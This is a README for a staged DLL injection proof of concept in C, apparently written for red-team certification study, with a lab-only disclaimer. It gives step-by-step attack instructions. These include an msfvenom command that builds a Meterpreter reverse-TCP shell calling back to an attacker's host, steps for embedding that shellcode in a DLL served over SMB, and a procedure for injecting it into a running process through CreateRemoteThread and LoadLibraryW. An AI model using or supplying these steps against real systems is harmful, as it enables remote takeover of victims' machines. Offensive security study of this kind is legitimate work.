# staged-DLL-Injection
Staged DLL injection proof-of-concept built in C using Win32 APIs — developed in an isolated lab environment for red team certification study (CRTO).

> ⚠️ **Disclaimer:** This project was developed strictly in an isolated lab environment for educational purposes as part of offensive security research and certification study (CRTO). It is not intended for use against any systems without explicit written authorization. Unauthorized use is illegal and unethical.

## Overview

A proof-of-concept implementation of staged DLL injection on Windows, built as part of red team certification studies. This project demonstrates how a stager can remotely load a malicious DLL into a target process using native Win32 APIs.
Works best in an AD Environment that allows SMB traffic within the internal network, not recommended to work over internet

## Usage

```c
1. Build a shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f raw -o /directory/payload.bin
2. Obtain the raw shellcode and convert into a C array
xxd -i payload.bin > payload.h
3. Copy the shellcode, and paste it under unsigned char payload_bin[] {xxxxx} array in maindll.c
4. Modify the phc.c to point the address to your IP in dllPath[]
5. Compile phc.c into .exe, and compile maindll.c into .dll file
6. Host the smb server, and paste the maindll.dll
7. Set up Listener
8. Open Notepad.exe and find the PID
9. Run phc.exe <PID>
```

## How It Works

### Stager (`phc.c`)
- Accepts a target process PID as a command line argument
- Opens a handle to the target process via `OpenProcess`
- Allocates memory inside the target process via `VirtualAlloc`
- Retrieves the address of `LoadLibraryW` from `Kernel32`
- Spawns a remote thread via `CreateRemoteThread` that calls `LoadLibraryW`, loading the DLL from a remote SMB share

### DLL (`maindll.dll`)
- Contains an embedded shellcode payload
- `DllMain` fires automatically on `DLL_PROCESS_ATTACH`
- Allocates executable memory via `VirtualAlloc`
- Copies shellcode into memory and executes it via `CreateThread`

## Attack Flow
phc.exe <PID>
→ Opens target process
→ Allocates memory in target process
→ Loads maindll.dll from SMB share via LoadLibraryW
→ DllMain fires
→ Shellcode executed inside target process

## Techniques Demonstrated

- Remote DLL injection via `CreateRemoteThread` + `LoadLibraryW`
- Shellcode embedding and execution in C
- DLL entry point abuse via `DllMain`
- Remote payload staging over SMB

## Built With

- C
- Win32 API
- msfvenom
- Sliver C2

## Environment

Tested on Windows 10 in an isolated lab environment. C2 listener hosted on Kali Linux.
